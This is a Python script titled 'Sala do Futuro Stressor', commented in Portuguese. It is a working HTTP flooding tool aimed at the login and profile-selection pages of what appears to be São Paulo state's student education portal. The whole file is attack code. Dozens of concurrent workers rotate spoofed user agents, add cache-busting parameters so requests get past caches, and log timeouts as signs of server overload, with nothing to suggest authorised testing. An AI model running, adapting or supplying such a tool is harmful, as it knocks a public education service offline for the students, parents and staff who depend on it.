import asyncio
import aiohttp
import random
import time
import os
import gc
import sys
import json
import re

# --- CONFIGURAÇÕES DE ALVOS: SALA DO FUTURO ---
# Foco em endpoints de autenticação e navegação crítica.
TARGETS = [
    {
        "name": "Login Alunos",
        "base_url": "https://saladofuturo.educacao.sp.gov.br/login-alunos",
        # Payloads para forçar o backend a processar sessões e validações
        "payloads": [
            "?redirect=/dashboard&_cb={cb}",
            "?next=/escolha-de-perfil&_cb={cb}",
            "?error=invalid_credentials&_cb={cb}",
            "?_cb={cb}&format=json"
        ]
    },
    {
        "name": "Escolha de Perfil",
        "base_url": "https://saladofuturo.educacao.sp.gov.br/escolha-de-perfil",
        # Payloads para forçar carregamento de dados de perfil
        "payloads": [
            "?perfil=aluno&_cb={cb}",
            "?perfil=responsavel&_cb={cb}",
            "?perfil=gov&_cb={cb}",
            "?_cb={cb}&verbose=true"
        ]
    },
    {
        "name": "Login Responsáveis",
        "base_url": "https://saladofuturo.educacao.sp.gov.br/login-responsaveis-gov",
        # Payloads para forçar validação de credenciais de governo
        "payloads": [
            "?redirect=/painel-responsavel&_cb={cb}",
            "?error=access_denied&_cb={cb}",
            "?_cb={cb}&format=json",
            "?auth=ldap&_cb={cb}"
        ]
    }
]

WORKERS_PER_TARGET = int(os.getenv("WORKERS_PER_TARGET", "25"))
TOTAL_WORKERS = WORKERS_PER_TARGET * len(TARGETS)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

class Stats:
    def __init__(self):
        self.requests = 0
        self.errors = 0
        self.start_time = time.time()
        self.status_codes = {}  # Rastreia códigos de resposta

    def get_rps(self):
        delta = time.time() - self.start_time
        return self.requests / delta if delta > 0 else 0

    def record_status(self, code):
        self.status_codes[code] = self.status_codes.get(code, 0) + 1

stats = Stats()
stop_event = asyncio.Event()

async def safe_request(session, url, headers, target_name, worker_id):
    """
    Executa a requisição e rastreia o status do site.
    """
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            # Leitura obrigatória para liberar o socket
            await resp.read()
            stats.requests += 1
            stats.record_status(resp.status)
            
            if resp.status >= 400:
                stats.errors += 1
            else:
                # Se o site estiver lento, o timeout pode ser o indicador
                pass

    except asyncio.TimeoutError:
        stats.errors += 1
        # Timeout indica que o servidor está sobrecarregado
        if stats.errors % 100 == 0:
            print(f"[WARN] {target_name} | Timeouts acumulados: {stats.errors}")
    except Exception as e:
        stats.errors += 1
        if stats.errors % 50 == 0:
            print(f"[WARN] {target_name} | Worker {worker_id} erro: {type(e).__name__}")

async def attack_worker(session, target_config, worker_id):
    """
    Worker que ataca um alvo específico rotacionando payloads.
    """
    base_url = target_config['base_url']
    payloads = target_config['payloads']
    target_name = target_config['name']
    
    headers_base = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Referer': base_url
    }
    
    payload_index = 0
    
    while not stop_event.is_set():
        try:
            headers = headers_base.copy()
            headers['User-Agent'] = random.choice(USER_AGENTS)
            
            # Seleciona um payload aleatório para variar o ataque
            payload_template = payloads[payload_index % len(payloads)]
            payload_index += 1
            
            # Insere o cache buster
            cache_buster = random.randint(100000, 999999)
            url = base_url + payload_template.replace("{cb}", str(cache_buster))
            
            await safe_request(session, url, headers, target_name, worker_id)
            
            # Jitter assíncrono para evitar sincronização total dos workers
            await asyncio.sleep(random.uniform(0.01, 0.05))

        except asyncio.CancelledError:
            break
        except Exception as e:
            if not stop_event.is_set():
                print(f"[ERROR] {target_name} | Worker {worker_id} exceção: {e}")
                await asyncio.sleep(1)

async def monitor_stats():
    """
    Monitora estatísticas e memória.
    Mostra a distribuição de status codes para diagnosticar o impacto.
    """
    while not stop_event.is_set():
        await asyncio.sleep(5)
        rps = stats.get_rps()
        uptime = int(time.time() - stats.start_time)
        h, r = divmod(uptime, 3600)
        m, s = divmod(r, 60)
        
        gc.collect()
        
        # Formata os status codes para log
        status_str = " | ".join([f"{code}: {count}" for code, count in stats.status_codes.items()])
        
        print(f"[STATS] Uptime: {h:02d}:{m:02d}:{s:02d} | RPS: {rps:.2f} | Req: {stats.requests} | Err: {stats.errors} | Status: {status_str}")

async def main():
    print(f"[INIT] Iniciando Sala do Futuro Stressor.")
    print(f"[INIT] Alvos: {len(TARGETS)}")
    print(f"[INIT] Workers por alvo: {WORKERS_PER_TARGET} (Total: {TOTAL_WORKERS})")
    
    # Connector otimizado para alta concorrência
    connector = aiohttp.TCPConnector(
        limit=0, 
        limit_per_host=100, # Limita conexões por host para não saturar o FD limit
        ttl_dns_cache=300,
        enable_cleanup_closed=True
    )
    
    timeout = aiohttp.ClientTimeout(total=20)
    
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        worker_id = 0
        
        for target in TARGETS:
            for _ in range(WORKERS_PER_TARGET):
                tasks.append(asyncio.create_task(attack_worker(session, target, worker_id)))
                worker_id += 1
        
        monitor_task = asyncio.create_task(monitor_stats())
        
        print("[INIT] Ataque ativo. Monitorando status...")
        
        try:
            while True:
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        finally:
            stop_event.set()
            monitor_task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            print("[EXIT] Processo encerrado.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[EXIT] Interrompido.")
    except Exception as e:
        print(f"[FATAL] Erro crítico: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
